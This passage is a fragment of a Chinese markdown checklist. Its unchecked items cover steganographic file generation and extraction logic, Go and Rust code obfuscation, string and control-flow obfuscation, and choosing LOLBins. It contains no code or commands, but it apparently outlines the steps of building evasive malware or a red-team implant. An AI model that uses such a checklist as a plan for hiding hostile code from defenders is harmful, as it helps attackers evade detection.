- [ ] 提取逻辑已编写
- [ ] 隐写文件已生成

### 代码混淆
- [ ] Go代码混淆已应用
- [ ] Rust代码混淆已实现
- [ ] 字符串混淆已配置
- [ ] 控制流混淆已设置
- [ ] LOLBins利用已选择